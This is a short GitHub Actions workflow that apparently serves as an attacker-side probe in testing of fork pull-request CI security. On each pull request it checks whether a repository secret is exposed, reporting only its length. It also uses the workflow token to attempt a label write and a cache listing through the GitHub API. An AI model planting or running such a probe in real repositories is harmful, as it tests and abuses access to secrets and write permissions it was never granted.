name: pr-check
on:
  pull_request:
jobs:
  demo:
    runs-on: ubuntu-latest
    steps:
      - name: marker
        env:
          S: ${{ secrets.F8_SECRET }}
          GT: ${{ github.token }}
        run: |
          echo "F8-FORK-CODE-EXECUTED-ATTACKER-ROUND2"
          echo "actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME"
          if [ -n "$S" ]; then echo "SECRET_PRESENT len=${#S}"; else echo "SECRET_ABSENT"; fi
          echo "--- token write probe (create a label) ---"
          curl -s -o /dev/null -w "labels_POST=%{http_code}\n" -X POST \
            -H "Authorization: Bearer $GT" -H "Accept: application/vnd.github+json" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/labels" -d '{"name":"f8-probe-label"}'
          echo "--- cache/artifact reachability ---"
          curl -s -o /dev/null -w "caches_GET=%{http_code}\n" \
            -H "Authorization: Bearer $GT" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/caches"
